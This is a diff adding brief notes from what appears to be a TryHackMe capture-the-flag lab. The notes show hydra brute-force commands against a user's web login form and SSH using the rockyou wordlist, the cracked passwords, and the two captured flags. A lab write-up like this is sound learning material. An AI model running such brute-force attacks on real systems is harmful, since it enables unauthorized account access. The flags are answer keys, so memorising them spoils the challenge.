@@ -1,0 +1,18 @@
+IP : 10.10.76.42
+
+Open Ports : 22,80
+
+
+molly's web password : hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.76.42 http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:Your username or password is incorrect."
+
+			[80][http-post-form] host: 10.10.76.42   login: molly   password: sunshine
+
+	Login and get the flag : THM{2673a7dd116de68e85c48ec0b1f2612e}
+
+molly's SSH password : hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.76.42 ssh
+			
+			[22][ssh] host: 10.10.76.42   login: molly   password: butterfly
+	
+	Login and get the flag : THM{c8eeb0468febbadea859baeb33b2541b}
+
+!!!
